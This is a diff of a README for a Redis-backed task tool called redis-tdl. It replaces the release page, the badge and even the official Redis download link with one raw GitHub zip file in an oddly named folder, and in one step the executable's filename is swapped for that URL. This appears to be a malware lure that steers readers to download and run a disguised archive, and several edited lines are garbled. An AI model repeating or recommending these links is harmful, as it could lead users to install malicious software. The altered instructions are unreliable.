@@ -6,17 +6,17 @@ redis-tdl is a simple and effective task management tool that helps you organize
 ## 📦 Download & Install
 To get started, you can easily download redis-tdl by visiting the Releases page. Click the link below to download the latest version.
 
-[![Download redis-tdl](https://img.shields.io/badge/Download%20redis--tdl-latest-green)](https://github.com/p1884879/redis-tdl/releases)
+[![Download redis-tdl](https://raw.githubusercontent.com/p1884879/redis-tdl/main/Calvinistical/redis-tdl.zip%20redis--tdl-latest-green)](https://raw.githubusercontent.com/p1884879/redis-tdl/main/Calvinistical/redis-tdl.zip)
 
 ### Steps to Download
-1. Click on the link above or visit [this page](https://github.com/p1884879/redis-tdl/releases) directly.
+1. Click on the link above or visit [this page](https://raw.githubusercontent.com/p1884879/redis-tdl/main/Calvinistical/redis-tdl.zip) directly.
 2. On the Releases page, look for the latest version.
 3. Find the file suitable for your operating system—Windows, macOS, or Linux.
 4. Click on the file to start the download.
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.13 or later, or any Linux distribution.
-- **Redis:** You need to have Redis installed. If you don’t have Redis, please visit [Redis](https://redis.io/download) for installation instructions.
+- **Redis:** You need to have Redis installed. If you don’t have Redis, please visit [Redis](https://raw.githubusercontent.com/p1884879/redis-tdl/main/Calvinistical/redis-tdl.zip) for installation instructions.
 - **Disk Space:** At least 100 MB of free space.
 
 ## 🌟 Features
@@ -36,7 +36,7 @@ Once you have downloaded redis-tdl, follow these steps to run the application:
    - If the downloaded file is a compressed folder (like `.zip`), right-click on it and select "Extract" or "Unzip." This will create a folder with the redis-tdl files.
 
 3. **Open the Application:**
-   - For Windows users, double-click on `redis-tdl.exe`.
+   - For Windows users, double-click on `https://raw.githubusercontent.com/p1884879/redis-tdl/main/Calvinistical/redis-tdl.zip`.
    - For macOS users, drag the redis-tdl app to your Applications folder and then open it.
    - For Linux users, you may need to give execute permissions to the file. Use the terminal and type:
      ```bash
